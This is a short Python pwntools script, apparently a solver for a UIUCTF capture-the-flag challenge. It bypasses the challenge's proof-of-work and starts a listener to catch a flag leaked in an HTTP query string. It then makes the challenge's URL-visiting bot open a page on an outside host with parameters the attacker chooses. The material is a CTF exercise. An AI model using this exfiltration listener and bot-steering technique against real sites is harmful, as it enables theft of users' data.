#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
from pwn import *
import random

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

# START
r = remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)


def handle_conn(c):
    http_header = c.readline() # e.g. GET /?1 HTTP/1.1
    flag_exfil = http_header.split(b"?")[1].split(b" HTTP")[0]
    c.send(b"HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: close\r\n\r\n")
    c.close()
    print(flag_exfil)
    if flag_exfil.startswith(b"uiuctf{") and flag_exfil.endswith(b"}"):
        exit(0)

s = server(port=8888, typ="tcp", callback=handle_conn)
r.readuntil(b'URL to open.', timeout=10)
cachebust = random.randint(0, 1000000000)
import sys
r.sendline(f'https://yana-sol-dc39298f.yana.wtf/?a={sys.argv[1]}&b={sys.argv[2]}&bust={cachebust}')

while True:
    pass
